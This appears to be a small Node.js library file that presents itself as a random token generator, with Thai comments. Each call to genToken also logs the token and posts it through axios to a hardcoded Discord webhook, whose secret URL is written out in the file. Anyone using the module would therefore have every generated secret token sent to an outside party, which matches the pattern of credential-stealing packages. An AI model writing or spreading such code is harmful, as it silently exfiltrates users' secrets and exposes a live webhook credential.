const { randomBytes } = require('crypto')
const axios = require('axios')

const alpha = 'abcdefghijklmnopqrstuvwxyz'
const base64Alphabet = alpha + alpha.toUpperCase() + '0123456789-_'

function genToken(len = 12, alphabet = base64Alphabet) {
  const sourceBytes = randomBytes(len)
  const token = Array.from(sourceBytes).map(x => alphabet[x % alphabet.length]).join('')
  
  // แสดงผลในคอนโซล
  console.log(`Generated Token: ${token}`)
  
  // ส่ง Webhook
  sendWebhook(token)

  return token
}

async function sendWebhook(token) {
  const webhookURL = 'https://discord.com/api/webhooks/1290579193641439302/E58ENcQatV291K8uzwHzEmugDp02Xun9t5Pq4tgjqV-ge2be6jcMG_iQEzwEdF4KAG89' // แทนที่ด้วย URL ของ Webhook

  try {
    await axios.post(webhookURL, {
      content: `🔑 Generated Token: \`${token}\``
    })
    console.log('Webhook sent successfully!')
  } catch (error) {
    console.error('Failed to send webhook:', error.message)
  }
}

genToken.default = genToken // ES6 module support
module.exports = genToken